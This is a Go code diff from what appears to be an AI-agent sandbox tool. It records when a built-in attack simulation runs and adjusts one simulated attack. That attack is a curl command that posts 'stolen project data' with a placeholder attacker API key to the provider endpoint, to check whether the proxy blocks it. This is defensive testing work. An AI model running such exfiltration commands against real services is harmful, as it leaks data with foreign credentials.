@@ -8,6 +8,7 @@ import (
 	"net"
 	"os"
 	"strings"
+	"sync"
 	"time"
 
 	"github.com/shaoxier/AIofCage/internal/mcp"
@@ -62,6 +63,8 @@ func (a *App) SimulateAttacks(id string) ([]AttackResult, error) {
 	if err != nil {
 		return nil, err
 	}
+	started := a.now()
+	defer func() { a.demos.add(sbx.ID, demoRun{Start: started, End: a.now()}) }()
 	results := make([]AttackResult, 0, len(attacks))
 	for _, attack := range attacks {
 		result := a.runAttack(ctx, sbx, attack)
@@ -149,7 +152,8 @@ EOF`)
 			result.Skipped, result.Note = true, "这个沙箱没有绑定供应商，跳过。"
 			return result
 		}
-		script := fmt.Sprintf(`curl -sS -m 15 -o /dev/null -D - -X POST -H 'Authorization: Bearer sk-attacker-own-key-0000000000' -H 'Content-Type: application/json' -d '{"input":"偷来的项目数据"}' https://%s%s 2>&1 | grep -iE '^(HTTP/|x-aiofcage-reason)' | tr -d '\r'`, host, path)
+		// The proxy's own "200 Connection established" comes first; only the final answer matters.
+		script := fmt.Sprintf(`curl -sS -m 15 -o /dev/null -D - -X POST -H 'Authorization: Bearer sk-attacker-own-key-0000000000' -H 'Content-Type: application/json' -d '{"input":"偷来的项目数据"}' https://%s%s 2>&1 | grep -iE '^(HTTP/|x-aiofcage-reason)' | tr -d '\r' | tail -2`, host, path)
 		out := a.exec(ctx, sbx, script)
 		result.Evidence = orNone(out)
 		result.Blocked = strings.Contains(out, "403") && strings.Contains(strings.ToLower(out), "credential_foreign")
@@ -243,6 +247,45 @@ func (a *App) firstProviderEndpoint(sbx sandbox.Sandbox) (string, string) {
 		return host, strings.TrimSuffix(rules[0].Path, "/*")
 	}
 	return "", ""
+}
+
+// demoLog remembers when the built-in attack demo ran in each sandbox, so the AI commentary can
+// tell demo traffic apart from what the agent did on its own.
+type demoLog struct {
+	mu   sync.Mutex
+	runs map[string][]demoRun
+}
+
+type demoRun struct {
+	Start time.Time `json:"start"`
+	End   time.Time `json:"end"`
+}
+
+// demoMargin absorbs clock skew between the VM (event times) and the Mac.
+const demoMargin = 5 * time.Second
+
+func (d *demoLog) add(id string, run demoRun) {
+	d.mu.Lock()
+	defer d.mu.Unlock()
+	if d.runs == nil {
+		d.runs = map[string][]demoRun{}
+	}
+	d.runs[id] = append(d.runs[id][max(0, len(d.runs[id])-9):], run)
+}
+
+func (d *demoLog) list(id string) []demoRun {
+	d.mu.Lock()
+	defer d.mu.Unlock()
+	return append([]demoRun(nil), d.runs[id]...)
+}
+
+func (d *demoLog) contains(id string, t time.Time) bool {
+	for _, run := range d.list(id) {
+		if !t.Before(run.Start.Add(-demoMargin)) && !t.After(run.End.Add(demoMargin)) {
+			return true
+		}
+	}
+	return false
 }
 
 func orNone(value string) string {
